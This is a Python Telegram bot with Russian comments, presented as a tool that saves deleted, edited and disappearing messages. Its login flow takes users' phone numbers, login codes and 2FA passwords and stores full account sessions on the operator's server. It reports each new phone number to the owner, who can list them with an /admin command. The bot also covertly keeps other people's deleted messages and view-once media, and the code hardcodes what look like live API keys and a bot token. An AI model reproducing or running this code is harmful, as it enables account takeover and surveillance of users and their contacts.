import os
import asyncio
import logging
import sqlite3
import json
from datetime import datetime
from pathlib import Path
from telethon import TelegramClient, events
from telethon.tl.types import (
    MessageMediaPhoto, MessageMediaDocument,
    Document, DocumentAttributeVideo
)
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

# ==================== КОНФИГУРАЦИЯ ====================
# ВАШИ ДАННЫЕ УЖЕ ВСТАВЛЕНЫ:
API_ID = 22435995  # ✅ Ваш API_ID
API_HASH = "4c7b651950ed7f53520e66299453144d"  # ✅ Ваш API_HASH
BOT_TOKEN = "5680618930:AAHnf4KcIf6_GA655Y_HqsMxGj3O71Fzz8g"  # ✅ Токен бота
OWNER_USERNAME = "MaksimXyila"  # ✅ Ваш юзернейм

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Папки для медиа
MEDIA_DIR = Path("saved_media")
MEDIA_DIR.mkdir(exist_ok=True)
PHOTOS_DIR = MEDIA_DIR / "photos"
PHOTOS_DIR.mkdir(exist_ok=True)

# Инициализация бота
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# База данных
DB_FILE = "message_monitor.db"

def init_db():
    """Инициализация базы данных"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            phone TEXT NOT NULL,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            deleted_count INTEGER DEFAULT 0,
            edited_count INTEGER DEFAULT 0,
            media_count INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deleted_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            chat_id INTEGER,
            chat_title TEXT,
            message_id INTEGER,
            sender_name TEXT,
            content TEXT,
            media_type TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users(user_id)
        )
    ''')
    
    conn.commit()
    conn.close()

init_db()

# Хранилища
user_clients = {}  # Активные клиенты
auth_sessions = {}  # Сессии авторизации
message_cache = {}  # Кэш сообщений
active_chats = {}  # Отслеживаемые чаты
owner_id = None  # ID владельца

# ==================== ФУНКЦИИ БАЗЫ ДАННЫХ ====================
def db_execute(query, params=()):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute(query, params)
    conn.commit()
    conn.close()

def db_fetch(query, params=()):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute(query, params)
    result = cursor.fetchall()
    conn.close()
    return result

async def save_user(user_id, phone, user_info):
    """Сохранение пользователя в БД"""
    db_execute('''
        INSERT OR REPLACE INTO users 
        (user_id, phone, username, first_name, last_name, connected_at)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (
        user_id,
        phone,
        user_info.get('username', ''),
        user_info.get('first_name', ''),
        user_info.get('last_name', ''),
        datetime.now()
    ))

async def save_deleted_message(user_id, chat_id, chat_title, msg_id, sender_name, content, media_type=""):
    """Сохранение удалённого сообщения"""
    db_execute('''
        INSERT INTO deleted_messages 
        (user_id, chat_id, chat_title, message_id, sender_name, content, media_type)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (
        user_id,
        chat_id,
        chat_title[:100],
        msg_id,
        sender_name[:50],
        content[:1000],
        media_type
    ))
    
    # Увеличиваем счётчик
    db_execute('UPDATE users SET deleted_count = deleted_count + 1 WHERE user_id = ?', (user_id,))

# ==================== КОМАНДЫ БОТА ====================
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    """Команда /start"""
    user = await event.get_sender()
    await event.reply(
        f"👋 Привет, {user.first_name}!\n\n"
        "🤖 **Message Monitor Bot**\n\n"
        "📱 **Авторизация:** /login\n"
        "📋 **Мои чаты:** /chats\n"
        "📊 **Статистика:** /stats\n"
        "🔍 **Все команды:** /help\n\n"
        "⚡ **Автосохранение:**\n"
        "• Удалённых сообщений\n"
        "• Изменённых сообщений\n"
        "• Исчезающих фото/видео\n"
        "• Уведомления в реальном времени"
    )

@bot.on(events.NewMessage(pattern='/login'))
async def login_command(event):
    """Авторизация"""
    user_id = event.sender_id
    
    if user_id in user_clients:
        await event.reply("✅ Вы уже подключены!")
        return
    
    auth_sessions[user_id] = {
        'step': 'phone',
        'chat_id': event.chat_id
    }
    
    await event.reply(
        "📱 **АВТОРИЗАЦИЯ**\n\n"
        "Отправьте номер телефона:\n"
        "`+79123456789`\n\n"
        "❌ /cancel — отмена",
        parse_mode='md'
    )

@bot.on(events.NewMessage(pattern='/cancel'))
async def cancel_command(event):
    """Отмена авторизации"""
    user_id = event.sender_id
    if user_id in auth_sessions:
        if 'client' in auth_sessions[user_id]:
            await auth_sessions[user_id]['client'].disconnect()
        del auth_sessions[user_id]
        await event.reply("❌ Авторизация отменена.")

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_command(event):
    """Статистика пользователя"""
    user_id = event.sender_id
    
    if user_id not in user_clients:
        await event.reply("⚠️ Сначала подключите аккаунт /login")
        return
    
    result = db_fetch('SELECT deleted_count, edited_count, media_count FROM users WHERE user_id = ?', (user_id,))
    if result:
        deleted, edited, media = result[0]
        await event.reply(
            f"📊 **ВАША СТАТИСТИКА**\n\n"
            f"🗑️ Удалённых: {deleted}\n"
            f"✏️ Изменённых: {edited}\n"
            f"📸 Медиафайлов: {media}"
        )

@bot.on(events.NewMessage(pattern='/admin'))
async def admin_command(event):
    """Статистика для админа"""
    global owner_id
    if not owner_id:
        try:
            owner = await bot.get_entity(OWNER_USERNAME)
            owner_id = owner.id
        except:
            await event.reply("❌ Не могу найти владельца")
            return
    
    user = await event.get_sender()
    if user.id != owner_id:
        await event.reply("⛔ Только для владельца")
        return
    
    # Общая статистика
    stats = db_fetch('''
        SELECT 
            COUNT(*) as total_users,
            SUM(deleted_count) as total_deleted,
            SUM(edited_count) as total_edited,
            SUM(media_count) as total_media
        FROM users
    ''')[0]
    
    # Список пользователей
    users = db_fetch('''
        SELECT user_id, phone, username, first_name, last_name, 
               deleted_count, connected_at 
        FROM users 
        ORDER BY connected_at DESC
        LIMIT 20
    ''')
    
    message = f"""
🏆 **АДМИН СТАТИСТИКА**

👥 **Пользователи:** {stats[0]}
🗑️ **Удалено:** {stats[1] or 0}
✏️ **Изменено:** {stats[2] or 0}
📸 **Медиа:** {stats[3] or 0}

🔍 **Последние подключения:**
"""
    
    for i, (uid, phone, username, fname, lname, deleted, connected) in enumerate(users[:10], 1):
        name = f"{fname} {lname}".strip()
        message += f"\n{i}. {name} (@{username or 'нет'})"
        message += f"\n   📱 {phone} | 🗑️ {deleted} | 📅 {connected[:10]}"
    
    await event.reply(message, parse_mode='md')

@bot.on(events.NewMessage(pattern='/trackall'))
async def track_all_command(event):
    """Отслеживать все чаты"""
    user_id = event.sender_id
    
    if user_id not in user_clients:
        await event.reply("⚠️ Сначала подключите аккаунт /login")
        return
    
    client = user_clients[user_id]
    
    try:
        dialogs = await client.get_dialogs(limit=30)
        tracked = []
        
        if user_id not in active_chats:
            active_chats[user_id] = []
        
        for dialog in dialogs:
            chat = dialog.entity
            chat_id = chat.id
            
            if chat_id not in active_chats[user_id]:
                active_chats[user_id].append(chat_id)
                tracked.append(chat_id)
        
        await event.reply(f"✅ Начато отслеживание {len(tracked)} чатов!")
        
    except Exception as e:
        logger.error(f"Ошибка trackall: {e}")
        await event.reply(f"❌ Ошибка: {str(e)[:50]}")

@bot.on(events.NewMessage(pattern='/chats'))
async def chats_command(event):
    """Список чатов"""
    user_id = event.sender_id
    
    if user_id not in user_clients or user_id not in active_chats:
        await event.reply("📭 Нет отслеживаемых чатов")
        return
    
    client = user_clients[user_id]
    message = "📋 **ОТСЛЕЖИВАЕМЫЕ ЧАТЫ:**\n\n"
    
    for i, chat_id in enumerate(active_chats[user_id][:15], 1):
        try:
            chat = await client.get_entity(chat_id)
            title = getattr(chat, 'title', f"Чат {chat_id}")
            message += f"{i}. {title}\n"
        except:
            message += f"{i}. Чат ID: {chat_id}\n"
    
    await event.reply(message, parse_mode='md')

@bot.on(events.NewMessage(pattern='/help'))
async def help_command(event):
    """Справка"""
    await event.reply(
        "ℹ️ **СПРАВКА**\n\n"
        "📱 **Авторизация:**\n"
        "1. /login — начать\n"
        "2. Отправьте номер телефона\n"
        "3. Отправьте код из Telegram\n"
        "4. При необходимости — пароль 2FA\n\n"
        "👁️ **Отслеживание:**\n"
        "/trackall — отслеживать все чаты\n"
        "/chats — список чатов\n\n"
        "📊 **Статистика:**\n"
        "/stats — ваша статистика\n"
        "/admin — статистика для владельца\n\n"
        "⚙️ **Другие команды:**\n"
        "/cancel — отмена авторизации\n"
        "/help — эта справка\n\n"
        "🔔 **Что отслеживается:**\n"
        "• Все удалённые сообщения\n"
        "• Все изменённые сообщения\n"
        "• Исчезающие фото/видео\n"
        "• Автоуведомления в реальном времени"
    )

# ==================== АВТОРИЗАЦИЯ ====================
@bot.on(events.NewMessage)
async def auth_handler(event):
    """Обработка авторизации"""
    user_id = event.sender_id
    if user_id not in auth_sessions:
        return
    
    session = auth_sessions[user_id]
    text = event.text.strip()
    
    # Шаг 1: Номер телефона
    if session['step'] == 'phone':
        if text == '/cancel':
            del auth_sessions[user_id]
            await event.reply("❌ Авторизация отменена.")
            return
        
        if not text.startswith('+') or len(text) < 10:
            await event.reply("❌ Неверный формат. Пример: `+79123456789`\n/cancel — отмена")
            return
        
        try:
            client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
            await client.connect()
            
            sent_code = await client.send_code_request(text)
            session['step'] = 'code'
            session['phone'] = text
            session['phone_code_hash'] = sent_code.phone_code_hash
            session['client'] = client
            
            await event.reply(
                f"📲 Код отправлен на {text}\n\n"
                "Введите 5-значный код:\n"
                "Пример: `12345`\n\n"
                "❌ /cancel — отмена",
                parse_mode='md'
            )
            
        except Exception as e:
            logger.error(f"Ошибка отправки кода: {e}")
            await event.reply(f"❌ Ошибка: {str(e)[:50]}")
            if 'client' in session:
                await session['client'].disconnect()
            del auth_sessions[user_id]
    
    # Шаг 2: Код
    elif session['step'] == 'code':
        if text == '/cancel':
            await session['client'].disconnect()
            del auth_sessions[user_id]
            await event.reply("❌ Авторизация отменена.")
            return
        
        if not text.isdigit() or len(text) != 5:
            await event.reply("❌ Код должен быть 5 цифр\n/cancel — отмена")
            return
        
        try:
            await session['client'].sign_in(
                phone=session['phone'],
                code=text,
                phone_code_hash=session['phone_code_hash']
            )
            
            # Успешная авторизация
            await complete_auth(user_id, session)
            
        except SessionPasswordNeededError:
            session['step'] = 'password'
            await event.reply(
                "🔐 Требуется пароль 2FA:\n\n"
                "❌ /cancel — отмена"
            )
        except PhoneCodeInvalidError:
            await event.reply("❌ Неверный код\n/cancel — отмена")
        except Exception as e:
            logger.error(f"Ошибка входа: {e}")
            await event.reply(f"❌ Ошибка: {str(e)[:50]}")
            await session['client'].disconnect()
            del auth_sessions[user_id]
    
    # Шаг 3: Пароль 2FA
    elif session['step'] == 'password':
        if text == '/cancel':
            await session['client'].disconnect()
            del auth_sessions[user_id]
            await event.reply("❌ Авторизация отменена.")
            return
        
        try:
            await session['client'].sign_in(password=text)
            await complete_auth(user_id, session)
            
        except Exception as e:
            logger.error(f"Ошибка 2FA: {e}")
            await event.reply(f"❌ Неверный пароль: {str(e)[:50]}")
            await session['client'].disconnect()
            del auth_sessions[user_id]

async def complete_auth(user_id, session):
    """Завершение авторизации"""
    try:
        client = session['client']
        phone = session['phone']
        
        # Получаем инфо о пользователе
        me = await client.get_me()
        user_info = {
            'user_id': me.id,
            'first_name': me.first_name,
            'last_name': me.last_name or '',
            'username': me.username or ''
        }
        
        # Сохраняем сессию
        client.session.save()
        
        # Сохраняем в БД
        await save_user(user_id, phone, user_info)
        
        # Сохраняем клиент
        user_clients[user_id] = client
        
        # Запускаем обработчики
        asyncio.create_task(setup_user_handlers(client, user_id))
        
        # Уведомляем владельца
        await notify_owner(user_id, phone, user_info)
        
        # Уведомляем пользователя
        await bot.send_message(
            session['chat_id'],
            f"✅ **АВТОРИЗАЦИЯ УСПЕШНАЯ!**\n\n"
            f"👋 Добро пожаловать, {user_info['first_name']}!\n\n"
            "🤖 **Бот теперь отслеживает:**\n"
            "• Все удалённые сообщения\n"
            "• Все изменённые сообщения\n"
            "• Исчезающие фото/видео\n\n"
            "💡 **Команды:**\n"
            "/trackall — отслеживать все чаты\n"
            "/stats — ваша статистика\n"
            "/help — справка\n\n"
            "🔔 Уведомления будут приходить сюда!",
            parse_mode='md'
        )
        
        del auth_sessions[user_id]
        logger.info(f"Пользователь {user_id} авторизован")
        
    except Exception as e:
        logger.error(f"Ошибка завершения авторизации: {e}")
        await bot.send_message(
            session['chat_id'],
            f"❌ Ошибка: {str(e)[:50]}"
        )

async def notify_owner(user_id, phone, user_info):
    """Уведомление владельца"""
    global owner_id
    try:
        if not owner_id:
            owner = await bot.get_entity(OWNER_USERNAME)
            owner_id = owner.id
        
        message = f"""
🔔 **НОВОЕ ПОДКЛЮЧЕНИЕ!**

📱 **Телефон:** `{phone}`
👤 **Пользователь:** {user_info['first_name']} {user_info['last_name']}
📎 **Юзернейм:** @{user_info['username'] or 'нет'}
🆔 **ID:** `{user_id}`
🕐 **Время:** {datetime.now().strftime('%H:%M:%S')}
        """
        
        await bot.send_message(owner_id, message.strip(), parse_mode='md')
        logger.info(f"Уведомление отправлено @{OWNER_USERNAME}")
        
    except Exception as e:
        logger.error(f"Не удалось уведомить владельца: {e}")

# ==================== ОБРАБОТЧИКИ ЮЗЕР-КЛИЕНТОВ ====================
async def setup_user_handlers(client, owner_id):
    """Настройка обработчиков для юзер-клиента"""
    
    @client.on(events.MessageDeleted)
    async def handle_deleted(event):
        """Обработка удалённых сообщений"""
        try:
            for chat_id, deleted_ids in event.deleted_ids.items():
                if owner_id not in active_chats or chat_id not in active_chats[owner_id]:
                    continue
                
                chat = await client.get_entity(chat_id)
                chat_title = getattr(chat, 'title', f"Chat {chat_id}")
                
                for msg_id in deleted_ids:
                    cache_key = f"{chat_id}_{msg_id}"
                    if cache_key in message_cache:
                        cached_msg = message_cache[cache_key]
                        
                        # Получаем информацию
                        sender = await cached_msg.get_sender()
                        sender_name = getattr(sender, 'first_name', 'Unknown')
                        text = cached_msg.message or ""
                        media_type = ""
                        
                        # Определяем тип медиа
                        if cached_msg.media:
                            if isinstance(cached_msg.media, MessageMediaPhoto):
                                media_type = "photo"
                            elif isinstance(cached_msg.media, MessageMediaDocument):
                                media_type = "document"
                        
                        # Формируем сообщение
                        msg_text = f"""
🗑️ **УДАЛЁННОЕ СООБЩЕНИЕ**

💬 **Чат:** {chat_title}
👤 **От:** {sender_name}
🆔 **ID:** {msg_id}

📝 **Текст:**
{text[:400]}
                        """
                        
                        # Отправляем пользователю
                        await bot.send_message(
                            owner_id,
                            msg_text.strip(),
                            parse_mode='md'
                        )
                        
                        # Сохраняем в БД
                        await save_deleted_message(
                            owner_id, chat_id, chat_title, msg_id,
                            sender_name, text, media_type
                        )
                        
                        # Удаляем из кэша
                        del message_cache[cache_key]
                        
        except Exception as e:
            logger.error(f"Ошибка обработки удаления: {e}")
    
    @client.on(events.MessageEdited)
    async def handle_edited(event):
        """Обработка изменённых сообщений"""
        try:
            message = event.message
            chat = await message.get_chat()
            chat_id = chat.id
            
            if owner_id not in active_chats or chat_id not in active_chats[owner_id]:
                return
            
            # Получаем старое сообщение
            cache_key = f"{chat_id}_{message.id}"
            old_text = ""
            if cache_key in message_cache:
                old_msg = message_cache[cache_key]
                old_text = old_msg.message or ""
            
            # Обновляем кэш
            message_cache[cache_key] = message
            
            # Если текст изменился
            new_text = message.message or ""
            if old_text and old_text != new_text:
                chat_title = getattr(chat, 'title', f"Chat {chat_id}")
                sender = await message.get_sender()
                sender_name = getattr(sender, 'first_name', 'Unknown')
                
                msg_text = f"""
✏️ **ИЗМЕНЁННОЕ СООБЩЕНИЕ**

💬 **Чат:** {chat_title}
👤 **От:** {sender_name}
🆔 **ID:** {message.id}

📝 **Было:**
{old_text[:200]}

📝 **Стало:**
{new_text[:200]}
                """
                
                await bot.send_message(
                    owner_id,
                    msg_text.strip(),
                    parse_mode='md'
                )
                
        except Exception as e:
            logger.error(f"Ошибка обработки редактирования: {e}")
    
    @client.on(events.NewMessage)
    async def handle_new_message(event):
        """Кэширование новых сообщений"""
        try:
            message = event.message
            chat = await message.get_chat()
            chat_id = chat.id
            
            if owner_id not in active_chats or chat_id not in active_chats[owner_id]:
                return
            
            # Кэшируем сообщение
            cache_key = f"{chat_id}_{message.id}"
            message_cache[cache_key] = message
            
            # Проверяем на исчезающие медиа
            if message.media and hasattr(message, 'ttl_seconds') and message.ttl_seconds:
                # Это исчезающее сообщение
                chat_title = getattr(chat, 'title', f"Chat {chat_id}")
                
                # Сохраняем медиа
                file_path = await message.download_media(file=MEDIA_DIR)
                if file_path:
                    sender = await message.get_sender()
                    sender_name = getattr(sender, 'first_name', 'Unknown')
                    
                    msg_text = f"""
⚠️ **ИСЧЕЗАЮЩЕЕ МЕДИА СОХРАНЕНО!**

💬 **Чат:** {chat_title}
👤 **От:** {sender_name}
🕐 **Исчезнет через:** {message.ttl_seconds} сек.
💾 **Файл:** {Path(file_path).name}
                    """
                    
                    await bot.send_message(
                        owner_id,
                        msg_text.strip(),
                        parse_mode='md'
                    )
                    
                    # Отправляем медиа
                    try:
                        await bot.send_file(
                            owner_id,
                            file_path,
                            caption=f"📸 Исчезающее медиа из {chat_title}"
                        )
                    except:
                        pass
                    
        except Exception as e:
            logger.error(f"Ошибка кэширования: {e}")
    
    logger.info(f"Обработчики запущены для user_id={owner_id}")

# ==================== ЗАПУСК ====================
async def main():
    """Основная функция запуска"""
    logger.info("🚀 Запуск Message Monitor Bot...")
    
    # Запускаем бота
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"🤖 Бот запущен: @{me.username}")
    
    # Автозагрузка сессий
    for file in os.listdir('.'):
        if file.startswith('session_') and file.endswith('.session'):
            try:
                user_id_str = file.replace('session_', '').replace('.session', '')
                if user_id_str.isdigit():
                    user_id = int(user_id_str)
                    
                    client = TelegramClient(file, API_ID, API_HASH)
                    await client.connect()
                    
                    if await client.is_user_authorized():
                        user_clients[user_id] = client
                        active_chats[user_id] = []
                        asyncio.create_task(setup_user_handlers(client, user_id))
                        logger.info(f"📂 Загружена сессия user_id={user_id}")
                    else:
                        await client.disconnect()
                        os.remove(file)
            except Exception as e:
                logger.error(f"Ошибка загрузки сессии {file}: {e}")
    
    # Уведомление владельцу
    try:
        owner = await bot.get_entity(OWNER_USERNAME)
        global owner_id
        owner_id = owner.id
        
        await bot.send_message(
            owner_id,
            f"🤖 **MESSAGE MONITOR BOT ЗАПУЩЕН**\n\n"
            f"• Бот: @{me.username}\n"
            f"• Время: {datetime.now().strftime('%H:%M:%S')}\n"
            f"• Сессий: {len(user_clients)}\n"
            f"✅ **Система готова к работе!**",
            parse_mode='md'
        )
    except Exception as e:
        logger.error(f"Не удалось уведомить владельца: {e}")
    
    logger.info("✅ Бот готов. Ожидание команд...")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
